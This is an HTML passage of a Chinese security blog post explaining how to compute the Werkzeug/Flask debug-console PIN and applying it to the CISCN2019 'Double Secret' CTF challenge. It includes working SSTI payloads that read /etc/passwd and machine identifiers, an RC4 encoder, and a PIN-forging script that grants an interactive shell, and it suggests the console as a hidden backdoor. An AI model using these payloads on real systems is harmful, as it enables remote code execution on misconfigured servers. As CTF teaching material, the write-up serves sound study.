class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure>
<p>最后生成的PIN码为638-233-100，输入后即可看到一个shell的交互界面<br><img src="../../images/python/flask/debug/23.png" alt=""> </p>
<h2 id="2-window下PIN码获取"><a href="#2-window下PIN码获取" class="headerlink" title="2.window下PIN码获取"></a>2.window下PIN码获取</h2><p>(1). uaername 可以从net user 命令查看，这里值为Administrator<br>(2). <code>getattr(mod, &#39;__file__&#39;, None)</code> flask目录下的一个app.py的绝对路径,这个值可以在报错页面看到。但有个需注意，python3是app.py，python2中是app.pyc。这里值为G:\code\venv\flaskProject2\lib\site-packages\flask\app.pyc<br><img src="../../images/python/flask/debug/24.png" alt=""><br>(3). str(uuid.getnode()) MAC地址 ipconfig /all<br><img src="../../images/python/flask/debug/25.png" alt=""><br>转化为10进制，这里值为137106045523937<br><img src="../../images/python/flask/debug/26.png" alt=""><br>(4). get_machine_id() 系统id 。<br><img src="../../images/python/flask/debug/27.png" alt=""><br>打开注册表查看<code>\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography</code>的MachineGuid 值<br><img src="../../images/python/flask/debug/28.png" alt=""><br>也可以用reg 命令行查询</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM\SOFTWARE\Microsoft\Cryptography</span><br></pre></td></tr></table></figure>
<p><img src="../../images/python/flask/debug/29.png" alt=""><br>这里值为e7090baa-1fff-45a8-9642-005948e998da<br>最后用上面的脚本生成PIN，结果尝试了一下是错了。  </p>
<p>重新调试了一下脚本，发现str(uuid.getnode())的MAC地址不对，我本机上有多个网卡，所以有多个MAC地址，我一开始以为是uuid.getnode()获取的是当前正在的网卡的MAC地址。看了一下uuid.getnode()的底层实现源码，才知道，它是执行了ipconfig /all,根据返回的结果，逐行地去正则匹配MAC地址，第一个匹配成功就返回。<br><img src="../../images/python/flask/debug/30.png" alt=""><br>所以我这里第一个返回的MAC地址为7C-B2-7D-23-D7-E5，转化为十进制后为137106045523941，最后生成的PIN码为296-090-416<br><img src="../../images/python/flask/debug/31.png" alt=""></p>
<h1 id="四、例题"><a href="#四、例题" class="headerlink" title="四、例题"></a>四、例题</h1><h2 id="1-werkzeug-1-0-1-之前的版本"><a href="#1-werkzeug-1-0-1-之前的版本" class="headerlink" title="1. werkzeug 1.0.1 之前的版本"></a>1. werkzeug 1.0.1 之前的版本</h2><p>以华东赛区的[CISCN2019 华东南赛区]Double Secret为例题<br>做题地址在BUUCTF  <a href="https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA]Double%20Secret" target="_blank" rel="noopener">https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA]Double%20Secret</a>  </p>
<p>在/secret?secret=123123 位置中，当secret的参数值超过5位数的时候，就会报一个交互的shell。<br>这里还存在SSTI，我们可以利用读取生成PIN码所需的变量值。 后端对secret传入的值进行RC4加密，RC4加密方式为：明文加密一次得到密文，再加密一次得到明文。  所以使用RC4脚本对要字符串进行加密，传入给secret中</p>
<p>rc4加密脚本  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_main</span><span class="params">(key = <span class="string">"init_key"</span>, message = <span class="string">"init_message"</span>)</span>:</span></span><br><span class="line">    <span class="comment"># print("RC4加密主函数")</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = str(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_init_sbox</span><span class="params">(key)</span>:</span></span><br><span class="line">    s_box = list(range(<span class="number">256</span>))  <span class="comment"># 我这里没管秘钥小于256的情况，小于256不断重复填充即可</span></span><br><span class="line">    <span class="comment"># print("原来的 s 盒：%s" % s_box)</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + ord(key[i % len(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="comment"># print("混乱后的 s 盒：%s"% s_box)</span></span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_excrypt</span><span class="params">(plain, box)</span>:</span></span><br><span class="line">    <span class="comment"># print("调用加密程序成功。")</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(chr(ord(s) ^ k))</span><br><span class="line">    <span class="comment"># print("res用于加密字符串，加密后是：%res" %res)</span></span><br><span class="line">    cipher = <span class="string">""</span>.join(res)</span><br><span class="line">    print(<span class="string">"加密后的字符串是: %s"</span> %quote(cipher))</span><br><span class="line">    <span class="comment">#print("加密后的输出(经过编码):")</span></span><br><span class="line">    <span class="comment">#print(str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))</span></span><br><span class="line">    <span class="keyword">return</span> (str(base64.b64encode(cipher.encode(<span class="string">'utf-8'</span>)), <span class="string">'utf-8'</span>))</span><br><span class="line"><span class="comment">#rc4_main("HereIsTreasure","&#123;&#123;''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/flag.txt').read()&#125;&#125;")</span></span><br><span class="line"><span class="comment">#rc4_main("HereIsTreasure","&#123;&#123;''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()&#125;&#125;")</span></span><br><span class="line"><span class="comment">#rc4_main("HereIsTreasure","&#123;&#123;''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/sys/class/net/eth0/address').read()&#125;&#125;")</span></span><br><span class="line">rc4_main(<span class="string">"HereIsTreasure"</span>,<span class="string">"&#123;&#123;''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/proc/self/cgroup').read()&#125;&#125;"</span>)</span><br></pre></td></tr></table></figure>
<p>（1）username<br>对如下字符串进行rc4加密，再传入secret中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">40</span>)(<span class="string">'/etc/passwd’).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure>
<p>加密后</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.%14%1E%12%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%96%3D%C2%9D%5B%C3%987%C3%AA%12%C2%B4%05%C2%84A%C2%BF%17%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%98&#x2F;%00%C2%90%C3%A9%03Y%C2%B2%C3%9B%1C%C2%AEJuT6%C3%BA%5C%C3%8C%3D%C2%A75%C3%9Dz%5C%3F2%0D%C3%86%C3%8BF</span><br></pre></td></tr></table></figure>
<p>可以得到username为glzjin<br><img src="../../images/python/flask/debug/34.png" alt=""> </p>
<p>（2）<code>getattr(mod, &#39;__file__&#39;, None)</code> 从报错页面得知为<code>/usr/local/lib/python2.7/site-packages/flask/app.pyc</code><br>（3）<code>str(uuid.getnode())</code><br>对如下字符串进行rc4加密，再传入secret中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address’).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>对得到的mac地址，转化为十进制2485410510816<br><img src="../../images/python/flask/debug/35.png" alt=""><br>（4）<code>get_machine_id()</code><br>对如下字符串进行rc4加密，再传入secret中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;&#x2F;proc&#x2F;self&#x2F;cgroup’).read()&#125;</span><br></pre></td></tr></table></figure>
<p>值为docker后面的字符串e86b36a1c2f2448c11ab6bad15fa05d61697462180527bb51d9e7aeb84c4d731<br><img src="../../images/python/flask/debug/36.png" alt=""><br>最后得到的6个变量的值分别为 </p>
<ul>
<li>username 值为glzjin</li>
<li>modname 值为flask.app</li>
<li><code>getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))</code> 值为Flask</li>
<li><code>getattr(mod, &#39;__file__&#39;, None)</code>值为/usr/local/lib/python2.7/site-packages/flask/app.pyc</li>
<li>str(uuid.getnode()) 值为2485410510816</li>
<li>get_machine_id() 值为e86b36a1c2f2448c11ab6bad15fa05d61697462180527bb51d9e7aeb84c4d731</li>
</ul>
<p>用如下脚本生成PIN</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">'glzjin'</span><span class="comment"># username</span></span><br><span class="line">    <span class="string">'flask.app'</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">'Flask'</span>,<span class="comment"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span></span><br><span class="line">    <span class="string">'/usr/local/lib/python2.7/site-packages/flask/app.pyc'</span> <span class="comment"># getattr(mod, '__file__', None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">'2485410510816'</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">'e86b36a1c2f2448c11ab6bad15fa05d61697462180527bb51d9e7aeb84c4d731'</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b'cookiesalt'</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">'__wzd'</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b'pinsalt'</span>)</span><br><span class="line">    num = (<span class="string">'%09d'</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">'-'</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">'0'</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure>
<p>输入正确的PIN码，得到一个交互的shell<br><img src="../../images/python/flask/debug/33.png" alt=""> </p>
<h2 id="werkzeug-1-0-1-版本"><a href="#werkzeug-1-0-1-版本" class="headerlink" title="werkzeug 1.0.1 版本"></a>werkzeug 1.0.1 版本</h2><h1 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h1><p>Flask debug 交互性 shell 需要对主机有一定的访问权限，从渗透的角度来看，比较适合做个隐藏的后门。</p>
</div><div class="post-copyright"><div class="post-copyright-author"><span class="post-copyright-meta">本文作者: </span><span class="post-copyright-info"><a href="mailto:undefined">ye1s</a></span></div><div class="post-copyright-type"><span class="post-copyright-meta">本文链接: </span><span class="post-copyright-info"><a href="https://blog.cfyqy.com/article/643a3db.html">https://blog.cfyqy.com/article/643a3db.html</a></span></div><div class="post-copyright-notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.cfyqy.com">ye1s</a>！</span></div></div><div class="post-copyright" id="comments-container"><script src="/js/comments/gitment.js"></script></div><script>let arr = location.href.split('/#more')[0].split('/');
let title = arr[arr.length - 1];
if (title === '') {
    title = arr[arr.length - 2]
}
var flag = false;
var gitFun = function () {
    try {
        var gitmentObj = window.GLOBAL_CONFIG.gitment;
        var gitment = new Gitment({
            id: decodeURI(title), // 可选。默认为 location.href
            owner: gitmentObj.owner,
            repo: gitmentObj.repo,
            oauth: {
                client_id: gitmentObj.client_id,
                client_secret: gitmentObj.client_secret
            },
        });
        gitment.render('comments-container');
        flag = true;
    } catch (e) {
        flag = false;
    }
}
var setIn = setInterval(() => {
    if (!flag) {
        gitFun();
    } else {
        clearInterval(setIn);
    }
}, 200);</script></article><div id="pagination"><div class="prev-post pull-left"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/article/500cdf7f.html"><i class="fas fa-angle-left">&nbsp;</i><span>mysql常用命令整理</span></a></div><div class="next-post pull-right"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/article/3347494d.html"><span>redis安全小结</span><span>&nbsp;</span><i class="fas fa-angle-right"></i></a></div></div><!--div!= paginator()--></div></div><div class="button-hover" id="return-top"><i class="fas fa-arrow-up" aria-hidden="true"></i></div><footer><div id="footer"><div class="button-hover" id="side-button"><i class="fas fa-arrow-right"></i></div><div class="right-content"><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fas fa-file-o"></i></span><span id="busuanzi_value_page_pv"></span><span></span></div><div class="copyright">&copy;2017 ～ 2021 By ye1s</div></div></div></footer></div><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery-3.3.1.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/velocity.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery.mCustomScrollbar.concat.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/fan.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/canvas_bg.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/utils.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/scroll.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/sidebar.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/copy.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/daovoice.js"></script><!--script(src=url)--><div class="search-dialog"><div id="algolia-search-title">Algolia</div><div class="search-close-button"><i class="fa fa-times"></i></div><!--div#current-refined-values--><!--div#clear-all--><div id="search-box"></div><!--div#refinement-list--><hr><div id="hits"></div><div id="algolia-pagination"></div></div><div class="search-mask"></div><script src="/js/search/algolia.js"></script></body></html>